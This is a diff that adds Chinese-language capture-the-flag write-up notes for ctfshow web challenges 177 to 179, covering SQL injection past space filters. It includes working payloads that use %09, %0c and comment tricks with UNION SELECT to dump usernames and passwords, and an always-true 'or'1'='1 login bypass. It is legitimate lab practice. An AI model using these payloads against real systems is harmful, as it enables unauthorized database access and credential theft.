@@ -1256,6 +1256,56 @@ print(base64.b64decode(flag))
 
 
 
+### web177
+
+这次过滤了空格，/**/或者%09绕过即可。
+
+order by试探了下只有三行，继续union select。
+
+很好，这次没有过滤select。
+
+那就直接把1，2，3换成id,username,password，最后接上%09from%09ctfshow_user%23
+
+成功拿到flag。
+
+![](.\SQL注入\web177.png)
+
+p.s:尝试1‘%9or%091=1%23，失败……
+
+
+
+### web178
+
+过滤了空格和*号。
+
+用%09绕过即可
+
+```
+1'%09union%09select%09id,username,password%09from%09ctfshow_user%23
+```
+
+完事，得到flag
+
+再试试这个也可以
+
+```
+id=1'or'1'='1'%23
+```
+
+![](.\SQL注入\web178.png)
+
+### web179
+
+它这次把%09绕过了，那就用%0c代替
+
+```
+1'%0cunion%0cselect%0cid,username,password%0cfrom%0cctfshow_user%23
+```
+
+后面基本过程相似，就不放图了。
+
+万能密码'or'1'='1'%23依旧坚挺，下道题试试看。
+
 ## 反序列化
 
 ### web254
